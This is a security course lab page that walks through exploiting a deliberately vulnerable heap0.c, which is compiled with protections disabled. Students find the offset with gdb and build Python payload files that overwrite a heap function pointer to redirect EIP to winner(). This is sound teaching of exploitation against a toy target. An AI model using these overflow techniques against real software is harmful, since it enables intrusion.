<h1>Proj 7: Very Simple Heap Overflow (10 pts.)</h1>
<h2>What You Need</h2>
A 32-bit x86 Kali Linux machine, real or virtual. The project was
written on Kali 2.
<h2>Purpose</h2>
To practice exploiting a very simple heap overflow vulnerability.
This one is easy to exploit because there's a pointer in
the heap that is used for a function call. That makes a
heap overflow as simple as a stack overflow targeting EIP.
<h2>Creating a Vulnerable Program</h2>
This program just echoes back text
from its command-line argument.
<p>
In Kali, in a Terminal window, execute
these commands:
<blockquote><pre><code><big><b><pre>
curl https://samsclass.info/127/proj/heap0.c > heap0.c
gcc heap0.c -w -g -no-pie -z execstack -o heap0
./heap0 HELLO
./heap0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</pre></b></big></code></pre></blockquote>
As shown below, running the program with "HELLO" works,
showing a "level has not been passed" message,
but running it with 90 'A' characters causes a "Segmentation
fault".
<p><img src="p7-heap1.png"><p>
<h2>Examining the Source Code</h2>
In Kali, in a Terminal window, execute
these commands:
<blockquote><pre><code><big><b>
nano heap0.c
</b></big></code></pre></blockquote>
As shown below,
two objects are defined
(called "data structures"), which
will be stored in a portion of memory called
a "heap".
<p>
The first object is <b>name[64]</b>, which has
enough space for 64 characters.
<p>
Then comes <b>fp</b>, which holds a 4-byte pointer--that
is, a RAM address.
<p>
Finally, there's a function named <b>winner()</b>.
As you might expect, our goal is to execute
that function.
<p><img src="p7-heap5.png"><p>
Scroll down to see the rest of heap0.c,
as shown below.
<p>
<p><img src="p7-heap4.png"><p>
Close the file with <b>Ctrl+X</b>.
<p>
<h2>Observing the Heap</h2>
Execute these commands to
run the program in the gdb debugger,
place a breakpoint, run it with a
short input string,
and examine the
process map:
<blockquote><pre><code><big><b><pre>
gdb ./heap0
list 25,40
b 38
run AAAA
info proc map
</pre></b></big></code></pre></blockquote>
Find the heap. When I did it,
the heap was the fourth item on the list,
starting at 0x804b000, as shown below.
<p><img src="p7-heap23.png"><p>
<p>
Execute this instruction to see the
contents of the heap, replacing the
address with the correct address of the
heap on your system.
<blockquote><pre><code><big><b>
x/120x 0x804b000
</b></big></code></pre></blockquote>
Find
"0x41414141" on the heap, as shown below.
You may have to press Enter to see more pages
of memory to find it on your system.
<p>
As highlighted below, two values are stored on
the heap: "0x41414141" is 'AAAA', and
a short distance after that there's an address,
which was 0x080484c1 when I did it.
<p>
<p><img src="p7-heap24.png"><p>
<p>
Execute this instruction to disassemble
the function "nowinner".
<blockquote><pre><code><big><b>
disassemble nowinner
</b></big></code></pre></blockquote>
As shown below, this function starts at
the address stored on the heap:
0x080484c1 on my system.
<p>
<p><img src="p7-heap25.png"><p>
Execute these instructions to exit the
debugger.
<blockquote><pre><code><big><b><pre>
q
y
</pre></b></big></code></pre></blockquote>
<h2>Observing a Crash</h2>
In Kali, in a Terminal window, execute this
command:
<blockquote><pre><code><big><b>
nano h1
</b></big></code></pre></blockquote>
Enter this code, as shown below:
<blockquote><pre><code><big><b>
#!/usr/bin/python

print 'A' * 90
</b></big></code></pre></blockquote>
<p><img src="p7-heap26.png"><p>
Save the file with <b>Ctrl+X</b>, <b>Y</b>,
<b>Enter</b>.
<p>
Execute these commands to make the file
executable, test it, and send it to
heap0:
<blockquote><pre><code><big><b>
chmod a+x h1
./h1
./heap0 $(./h1)
</b></big></code></pre></blockquote>
<p><img src="p7-heap9.png"><p>
90 characters are enough to crash
the program.
<h2>Controlling the EIP</h2>
Execute these commands to
make a modified attack file,
to find out what characters ended up
in $eip.
<blockquote><pre><code><big><b>
cp h1 h2
nano h2
</b></big></code></pre></blockquote>
Modify the file to send only 70 'A'
characters followed by 20 bytes in a
nonrepeating pattern, as shown
below.
<p><img src="p7-heap27.png"><p>
Save the file with <b>Ctrl+X</b>, <b>Y</b>,
<b>Enter</b>.
<h2>Debugging the Program</h2>
Execute these commands to
run the program in the gdb debugger,
send the attack to it, and examine
the registers.
<blockquote><pre><code><big><b>
gdb -q ./heap0
run $(./h2)
info registers
q
y
</b></big></code></pre></blockquote>
As shown below, the program crashes with
$eip = 0x36303530, or the ASCII text
'0506'.
<p><img src="p7-heap28.png"><p>
On my system, the characters before
the EIP were 70 "A"s + '0001020304'
for a total of 80 characters.
<h2>Targeting the EIP</h2>
Execute these commands to
make an modified attack program
that attempts to put 'BCDE' into the
EIP.
<blockquote><pre><code><big><b>
cp h2 h3
nano h3
</b></big></code></pre></blockquote>
Modify the file as shown
below.
<p><img src="p7-heap29.png"><p>
Save the file with <b>Ctrl+X</b>, <b>Y</b>,
<b>Enter</b>.
<h2>Debugging the Program</h2>
Execute these commands to
run the program in the gdb debugger,
send the attack to it, and examine
the registers.
<blockquote><pre><code><big><b>
gdb -q ./heap0
run $(./h3)
info registers
</b></big></code></pre></blockquote>
As shown below, the program crashes with
$eip = 0x45444342, or the ASCII text
'BCDE'.
<p><img src="p7-heap30.png"><p>
<h2>Finding an Address to Inject</h2>
Execute these commands to
disassemble the winner()
function.
<blockquote><pre><code><big><b>
disassemble winner
q
y
</b></big></code></pre></blockquote>
As shown below, the function started
at address <b>0x08048496</b> on my system. Your
address may be different--use the
address you see on your screen.
<p><img src="p7-heap31.png"><p>
<h2>The Final Exploit File</h2>
Execute these commands to
make another attack program
that puts <b>0x08048496</b> into the
EIP.
<blockquote><pre><code><big><b>
cp h3 h4
nano h4
</b></big></code></pre></blockquote>
Modify the file as shown
below.
<p><img src="p7-heap32.png"><p>
Save the file with <b>Ctrl+X</b>, <b>Y</b>,
<b>Enter</b>.
<h2>Testing the Exploit</h2>
Execute this command:
<blockquote><pre><code><big><b>
./heap0 $(./h4)
</b></big></code></pre></blockquote>
You should see the "<b>level passed</b>"
message, as shown below.
<p><img src="p7-heap16.png"><p>
<h2>Saving a Screen Image</h2>
Make sure the "<b>level passed</b>"
message is visible,
as shown above.
<p>
Click on the host system's desktop to make it
active.
<p>
Press the <b>PrintScrn</b> key to copy the whole desktop to the clipboard.
<p>
<b>YOU MUST SUBMIT A FULL-SCREEN IMAGE FOR FULL CREDIT!</b>
<p>
